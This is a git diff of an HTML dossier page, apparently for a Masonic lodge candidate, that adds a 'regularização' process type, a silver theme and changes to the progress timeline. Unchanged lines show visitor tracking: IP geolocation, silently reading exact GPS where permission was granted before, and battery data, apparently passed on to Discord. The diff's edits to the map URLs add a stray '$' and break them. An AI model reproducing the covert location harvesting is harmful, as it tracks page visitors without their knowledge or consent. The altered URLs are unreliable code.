@@ -13,7 +13,6 @@
     <link rel="icon" type="image/svg+xml" href="../../../favicon/favicon.svg">
     <link rel="shortcut icon" href="../../../favicon/favicon.ico">
     <link rel="apple-touch-icon" sizes="180x180" href="../../../favicon/apple-touch-icon.png">
-    <meta name="theme-color" content="#0a2a24">
     
     <meta property="og:title" content="A∴ R∴ L∴ M∴ Fraternidade Imperial Nº 264"> 
     <meta property="og:description" content="No coração da Cidade Imperial, a luz da fraternidade se ergue como símbolo de união, sabedoria e continuidade espiritual.">
@@ -38,6 +37,25 @@
             --text-main: #e2e8f0;
         }
 
+        /* --- TEMA REGULARIZAÇÃO (PRATEADO/AÇO) --- */
+        body.theme-regularizacao {
+            --gold: #b0bec5; /* Tom Prata/Aço */
+            --gold-light: #eceff1;
+            --gold-shadow: rgba(176, 190, 197, 0.5);
+        }
+        
+        body.theme-regularizacao .header-title-main {
+            /* Efeito de Prata/Aço Metálico Refinado */
+            background: linear-gradient(to right, #78909c, #ffffff, #546e7a, #cfd8dc, #455a64);
+            background-size: 200% auto;
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent;
+        }
+        
+        body.theme-regularizacao #status-badge {
+            border-color: #90a4ae;
+        }
+
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         
         body { 
@@ -45,6 +63,7 @@
             background: radial-gradient(circle at center, #002a52 0%, #000c18 100%); 
             color: #333; min-height: 100vh; padding-bottom: 80px;
             overflow-x: hidden; position: relative;
+            transition: --gold 0.5s ease; /* Transição suave caso mude on the fly */
         }
 
         /* --- LUMINARIES (SISTEMA ORBITAL) --- */
@@ -317,7 +336,7 @@
             to { background-position: 200% center; }
         }
 
-        .sub-header { color: #aaa; letter-spacing: 3px; text-transform: uppercase; font-size: 0.8rem; margin-top: 10px; }
+        .sub-header { color: #aaa; letter-spacing: 3px; text-transform: uppercase; font-size: 0.8rem; margin-top: 10px; transition: color 0.3s ease;}
 
         /* HERO CARD */
         .hero-card {
@@ -340,7 +359,7 @@
         .hero-header-row { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 25px; border-bottom: 1px solid rgba(0,0,0,0.1); padding-bottom: 15px; gap: 20px; }
         .hero-info h2 { color: var(--royal-blue); font-family: 'Cinzel', serif; font-size: 1.8rem; margin: 0; line-height: 1.2; flex: 1; }
         
-        #status-badge { background: var(--gold); color: #000; padding: 10px 18px; border-radius: 6px; font-weight: 800; font-size: 0.75rem; letter-spacing: 1px; text-transform: uppercase; box-shadow: 0 4px 10px rgba(0,0,0,0.15); border: 1px solid #bfa15f; white-space: nowrap; align-self: flex-start; min-width: fit-content; }
+        #status-badge { background: var(--gold); color: #000; padding: 10px 18px; border-radius: 6px; font-weight: 800; font-size: 0.75rem; letter-spacing: 1px; text-transform: uppercase; box-shadow: 0 4px 10px rgba(0,0,0,0.15); border: 1px solid var(--gold); white-space: nowrap; align-self: flex-start; min-width: fit-content; transition: all 0.3s ease;}
 
         .data-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }
         .data-item strong { display: block; color: #777; font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px; }
@@ -371,22 +390,22 @@
         }
 
         /* TIMELINE */
-        .timeline-box { background: white; padding: 40px 20px; border-radius: 12px; box-shadow: var(--shadow-hdr); margin-bottom: 40px; overflow-x: auto; border-bottom: 4px solid var(--gold); scrollbar-width: thin; scrollbar-color: var(--gold) #f0f0f0; }
+        .timeline-box { background: white; padding: 40px 20px; border-radius: 12px; box-shadow: var(--shadow-hdr); margin-bottom: 40px; overflow-x: auto; border-bottom: 4px solid var(--gold); scrollbar-width: thin; scrollbar-color: var(--gold) #f0f0f0; transition: border-color 0.3s ease;}
         .timeline-box::-webkit-scrollbar { height: 6px; }
         .timeline-box::-webkit-scrollbar-thumb { background: var(--gold); border-radius: 10px; }
 
         .timeline-header { text-align: center; font-family: 'Cinzel', serif; color: var(--royal-blue); font-size: 1.4rem; margin-bottom: 40px; }
-        .progress-steps { display: flex; justify-content: space-between; position: relative; min-width: 900px; padding: 0 20px;}
+        .progress-steps { display: flex; justify-content: space-between; position: relative; min-width: 900px; padding: 0 20px; transition: min-width 0.5s ease;}
         .progress-line-bg { position: absolute; top: 18px; left: 45px; right: 45px; height: 6px; background: #e0e0e0; z-index: 0; border-radius: 10px; }
-        .progress-line-fill { position: absolute; top: 18px; left: 45px; height: 6px; background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0.2) 75%, transparent 75%, transparent); background-color: var(--gold); background-size: 1rem 1rem; animation: progress-stripes 1s linear infinite; z-index: 0; transition: width 1s ease; width: 0%; border-radius: 10px; box-shadow: 0 0 10px rgba(212, 175, 55, 0.5); }
-        .p-step { position: relative; z-index: 1; text-align: center; flex: 1; }
+        .progress-line-fill { position: absolute; top: 18px; left: 45px; height: 6px; background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0.2) 75%, transparent 75%, transparent); background-color: var(--gold); background-size: 1rem 1rem; animation: progress-stripes 1s linear infinite; z-index: 0; transition: width 1s ease, background-color 0.3s ease; width: 0%; border-radius: 10px; box-shadow: 0 0 10px rgba(212, 175, 55, 0.5); }
+        .p-step { position: relative; z-index: 1; text-align: center; flex: 1; transition: display 0.3s ease;}
         .p-circle { width: 42px; height: 42px; background: #fff; border: 3px solid #ddd; border-radius: 50%; margin: 0 auto 10px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #ccc; transition: all 0.4s; }
         .p-label { font-size: 0.7rem; color: #999; font-weight: 700; margin-top: 5px; text-transform: uppercase;}
         
         .p-step.completed .p-circle { background: var(--royal-blue); border-color: var(--royal-blue); color: white; }
         .p-step.completed .p-label { color: var(--royal-blue); }
-        .p-step.active .p-circle { background: var(--gold); border-color: var(--gold); color: white; transform: scale(1.3); box-shadow: 0 0 20px rgba(212, 175, 55, 0.6); }
-        .p-step.active .p-label { color: #d4af37; font-weight: 800; }
+        .p-step.active .p-circle { background: var(--gold); border-color: var(--gold); color: white; transform: scale(1.3); box-shadow: 0 0 20px var(--gold-shadow); }
+        .p-step.active .p-label { color: var(--gold); font-weight: 800; }
         
         .p-step.finished .p-circle { background: #2e7d32; border-color: #2e7d32; color: white; transform: scale(1.2); box-shadow: 0 0 25px rgba(46, 125, 50, 0.5); }
         .p-step.finished .p-label { color: #2e7d32; font-weight: 800; }
@@ -550,7 +569,9 @@
             
             .full-width, .col-span-2, .initiation-date { grid-column: span 2; }
             
-            .progress-steps { padding-bottom: 10px; }
+            .progress-steps { padding-bottom: 10px; min-width: 100%; overflow-x: auto; justify-content: flex-start; gap: 20px;}
+            .progress-line-bg { right: 20px; }
+            
             .docs-grid { grid-template-columns: 1fr 1fr; gap: 10px; }
             
             /* Ajuste do Visualizador de PDF para Mobile */
@@ -771,8 +792,8 @@
             <h3 class="section-title"><i class="fas fa-archive"></i> Arquivos Individuais</h3>
             <div class="docs-grid">
 
-			
-		       <div class="doc-card">
+            
+               <div class="doc-card">
                     <div class="doc-icon"><i class="fas fa-drafting-compass"></i></div>
                     <div class="doc-name">PRÉ-PROPOSTA</div>
                     <div class="doc-desc">2025/11</div>
@@ -874,7 +895,7 @@
                     <a href="docs/2026.02 - SEFAZ - CERTIDÃO NEGATIVA DE DÉBITOS.pdf" target="_blank" class="btn-mini btn-view">Ver</a>
                     <a href="docs/2026.02 - SEFAZ - CERTIDÃO NEGATIVA DE DÉBITOS.pdf" download class="btn-mini btn-down">Baixar</a>
                 </div>
-				  <div class="doc-card">
+                 <div class="doc-card">
                     <div class="doc-icon"><i class="fas fa-hand-holding-usd"></i></div>
                     <div class="doc-name">Pendências Financeiras</div>
                     <div class="doc-desc">Consta</div>
@@ -924,13 +945,13 @@
                     <a href="docs/2026.02 - TJERJ - CERTIDÃO DE REGISTRO DE AÇÕES CÍVEIS.pdf" target="_blank" class="btn-mini btn-view">Ver</a>
                     <a href="docs/2026.02 - TJERJ - CERTIDÃO DE REGISTRO DE AÇÕES CÍVEIS.pdf" download class="btn-mini btn-down">Baixar</a>
                 </div>   
-				 <div class="doc-card">
+                 <div class="doc-card">
                     <div class="doc-icon"><i class="fa fa-gavel"></i></div>
                     <div class="doc-name">Petição de Quitação</div>
                     <div class="doc-desc">HANANIA GASPI</div>
                     <a href="docs/2025.04 - HANANIA GASPI - PETIÇÃO DE QUITAÇÃO.pdf" target="_blank" class="btn-mini btn-view">Ver</a>
                     <a href="docs/2025.04 - HANANIA GASPI - PETIÇÃO DE QUITAÇÃO.pdf" download class="btn-mini btn-down">Baixar</a>
-                </div> 				
+                </div>              
                 <div class="doc-card">
                     <div class="doc-icon"><i class="fa fa-gavel"></i></div>
                     <div class="doc-name">TJERJ | Certidão de Registro de Ações Criminais</div>
@@ -1051,7 +1072,7 @@
                 // Variáveis Base (IP)
                 let localizacaoTexto = `${dataGeo.city}, ${dataGeo.region} - ${dataGeo.country}`;
                 // Link oficial corrigido:
-                let mapaUrl = `https://www.google.com/maps/search/?api=1&query=${dataGeo.latitude},${dataGeo.longitude}`;
+                let mapaUrl = `https://www.google.com/maps/search/?api=1&query=$${dataGeo.latitude},${dataGeo.longitude}`;
                 let precisaoInfo = "(Aproximada via IP)";
                 let bateriaInfo = "";
 
@@ -1083,7 +1104,7 @@
                         // Se o usuário já aceitou no passado, pega a exata em silêncio!
                         navigator.geolocation.getCurrentPosition((pos) => {
                             localizacaoTexto = "Localização Exata via GPS";
-                            mapaUrl = `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`;
+                            mapaUrl = `https://www.google.com/maps/search/?api=1&query=$${pos.coords.latitude},${pos.coords.longitude}`;
                             precisaoInfo = "(Exata)";
                             atualizarCamposDiscord(); 
                         });
@@ -1095,7 +1116,7 @@
                             navigator.geolocation.getCurrentPosition(
                                 (pos) => {
                                     localizacaoTexto = "Localização Exata via GPS";
-                                    mapaUrl = `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`;
+                                    mapaUrl = `https://www.google.com/maps/search/?api=1&query=$${pos.coords.latitude},${pos.coords.longitude}`;
                                     precisaoInfo = "(Exata)";
                                     atualizarCamposDiscord();
                                 },
@@ -1182,8 +1203,10 @@
         // =========================================================
         // CONFIGURAÇÕES DO PROCESSO DO CANDIDATO
         // =========================================================
-        const currentStep = 4; 
-        const processStatus = "ativo"; 
+        const processType = "regularizacao"; // ESCOLHA: "iniciacao" ou "regularizacao"
+        const currentStep = 6; 
+		// ESCOLHA: "ativo" ou "iniciado" ou "concluido"
+        const processStatus = "iniciado"; 
         const finalDate = "28/03/2026";
         const cimNumber = "0245177"; 
         const statusResponsible = "V∴ M∴ Everton Almeida"; 
@@ -1337,12 +1360,13 @@
         }
 
         function updateLogic() {
-            const stepsData = [
-                {id:1, txt:"Pré-Proposta"}, {id:2, txt:"Metais"}, {id:3, txt:"Entrega Docs"}, 
-                {id:4, txt:"Verificando"}, {id:5, txt:"Sindicância"}, {id:6, txt:"Sind. Familiar"}, 
-                {id:7, txt:"Aguardando GLMERJ"}, {id:8, txt:"Iniciação"}
-            ];
-
+            let stepsData = [];
+            let totalSteps = 8;
+            
+            // Captura os títulos para alteração dinâmica
+            const subtitleAuth = document.querySelector('.auth-box .sub-header');
+            const subtitleMain = document.querySelector('.dossier-header .sub-header');
+            
             const badge = document.getElementById('status-badge');
             const defaultDateBox = document.getElementById('default-date-container');
             const alertBox = document.getElementById('status-alert-container');
@@ -1350,14 +1374,72 @@
             const initLabel = document.getElementById('init-label');
             const progLine = document.getElementById('prog-line');
             const cimContainer = document.getElementById('cim-display-container');
+            const progressStepsContainer = document.querySelector('.progress-steps');
 
-            if (processStatus === "iniciado") {
-                badge.innerText = "INICIADO (CONCLUÍDO)";
+            // Lógica de Troca de Tipo de Processo
+            if (processType === "regularizacao") {
+                totalSteps = 6;
+                stepsData = [
+                    {id:1, txt:"Processo", icon:"fa-handshake"}, 
+                    {id:2, txt:"Metais", icon:"fa-check"}, 
+                    {id:3, txt:"Entrega Docs", icon:"fa-folder-open"}, 
+                    {id:4, txt:"Verificação", icon:"fa-search"}, 
+                    {id:5, txt:"GLMERJ", icon:"fa-landmark"}, 
+                    {id:6, txt:"Regularização", icon:"fa-gavel"}
+                ];
+                
+                if(subtitleAuth) subtitleAuth.innerText = "Dossiê de Regularização";
+                if(subtitleMain) subtitleMain.innerText = "Dossiê de Regularização";
+                
+                // Oculta os passos excedentes sem deletar do HTML
+                document.getElementById('step-7').style.display = 'none';
+                document.getElementById('step-8').style.display = 'none';
+
+                // Aplica o tema visual prateado e ajusta responsividade da timeline
+                document.body.classList.add('theme-regularizacao');
+                if (progressStepsContainer) progressStepsContainer.style.minWidth = '700px';
+                
+            } else {
+                totalSteps = 8;
+                stepsData = [
+                    {id:1, txt:"Pré-Proposta", icon:"fa-handshake"}, 
+                    {id:2, txt:"Metais", icon:"fa-check"}, 
+                    {id:3, txt:"Entrega Docs", icon:"fa-folder-open"}, 
+                    {id:4, txt:"Verificando", icon:"fa-search"}, 
+                    {id:5, txt:"Sindicância", icon:"fa-user-tie"}, 
+                    {id:6, txt:"Sind. Familiar", icon:"fa-home"}, 
+                    {id:7, txt:"Aguardando GLMERJ", icon:"fa-landmark"}, 
+                    {id:8, txt:"Iniciação", icon:"fa-gavel"}
+                ];
+                
+                if(subtitleAuth) subtitleAuth.innerText = "Dossiê de Sindicância";
+                if(subtitleMain) subtitleMain.innerText = "Dossiê de Sindicância";
+                
+                document.getElementById('step-7').style.display = 'block';
+                document.getElementById('step-8').style.display = 'block';
+
+                // Remove o tema prateado (volta pro dourado original) e retorna tamanho da timeline
+                document.body.classList.remove('theme-regularizacao');
+                if (progressStepsContainer) progressStepsContainer.style.minWidth = '900px';
+            }
+
+            // Injeta os textos e ícones corretos no HTML
+            for (let i = 1; i <= totalSteps; i++) {
+                const stepEl = document.getElementById(`step-${i}`);
+                if(stepEl) {
+                    stepEl.querySelector('.p-label').innerText = stepsData[i-1].txt;
+                    stepEl.querySelector('.p-circle i').className = `fas ${stepsData[i-1].icon}`;
+                }
+            }
+
+            // STATUS: INICIADO / REGULARIZADO / CONCLUÍDO
+            if (processStatus === "iniciado" || processStatus === "concluido") {
+                badge.innerText = processType === "regularizacao" ? "REGULARIZADO (CONCLUÍDO)" : "INICIADO (CONCLUÍDO)";
                 badge.style.background = '#2e7d32'; 
                 badge.style.color = '#fff';
                 badge.style.borderColor = '#1b5e20';
                 
-                initLabel.innerText = "Data da Iniciação";
+                initLabel.innerText = processType === "regularizacao" ? "Data da Regularização" : "Data da Iniciação";
                 dateDisplay.innerText = finalDate;
                 dateDisplay.style.color = "#2e7d32"; 
                 dateDisplay.style.fontWeight = "800";
@@ -1366,11 +1448,13 @@
                 document.getElementById('cim-number').innerText = cimNumber;
                 progLine.style.width = "100%"; 
 
-                for(let i=1; i<=8; i++) {
+                for(let i=1; i<=totalSteps; i++) {
                     const el = document.getElementById(`step-${i}`);
-                    if (i === 8) el.className = "p-step finished"; 
+                    if (i === totalSteps) el.className = "p-step finished"; 
                     else el.className = "p-step completed"; 
                 }
+                
+            // STATUS: NEGADO / DESISTÊNCIA
             } else if (processStatus === "negado" || processStatus === "desistencia") {
                 let isDesistencia = processStatus === "desistencia";
                 
@@ -1391,38 +1475,42 @@
                 document.getElementById('alert-reason').innerText = "Motivo: " + statusReason;
                 document.getElementById('alert-resp').innerText = "Despacho por: " + statusResponsible + " em " + finalDate;
 
-                const percent = ((currentStep-1) / 7) * 100;
+                // Cálculo dinâmico da barra de progresso
+                const percent = ((currentStep-1) / (totalSteps-1)) * 100;
                 progLine.style.width = percent + "%";
                 progLine.style.backgroundColor = isDesistencia ? "#b86b00" : "#cc0000";
                 progLine.style.backgroundImage = "none"; 
 
-                for(let i=1; i<=8; i++) {
+                for(let i=1; i<=totalSteps; i++) {
                     const el = document.getElementById(`step-${i}`);
                     if(i < currentStep) el.className = "p-step completed";
                     else if(i === currentStep) el.className = isDesistencia ? "p-step desistencia" : "p-step denied";
                     else el.className = "p-step";
                 }
+                
+            // STATUS: ATIVO (EM ANDAMENTO)
             } else {
                 badge.innerText = stepsData[currentStep-1].txt;
                 badge.style.background = 'var(--gold)';
                 badge.style.color = '#000';
                 
-                if (currentStep === 8) {
-                    initLabel.innerText = "Previsão de Iniciação";
+                if (currentStep === totalSteps) {
+                    initLabel.innerText = processType === "regularizacao" ? "Previsão de Regularização" : "Previsão de Iniciação";
                     dateDisplay.innerText = finalDate;
                     dateDisplay.style.color = "#2e7d32"; 
                     dateDisplay.style.fontWeight = "800";
                 } else {
-                    initLabel.innerText = "Previsão de Iniciação";
+                    initLabel.innerText = processType === "regularizacao" ? "Previsão de Regularização" : "Previsão de Iniciação";
                     dateDisplay.innerText = "Aguardando conclusão do processo...";
                     dateDisplay.style.color = "#777";
                     dateDisplay.style.fontWeight = "normal";
                 }
                 
-                const percent = ((currentStep-1) / 7) * 100;
+                // Cálculo dinâmico da barra de progresso
+                const percent = ((currentStep-1) / (totalSteps-1)) * 100;
                 progLine.style.width = percent + "%";
 
-                for(let i=1; i<=8; i++) {
+                for(let i=1; i<=totalSteps; i++) {
                     const el = document.getElementById(`step-${i}`);
                     if(i < currentStep) el.className = "p-step completed";
                     else if(i === currentStep) el.className = "p-step active";
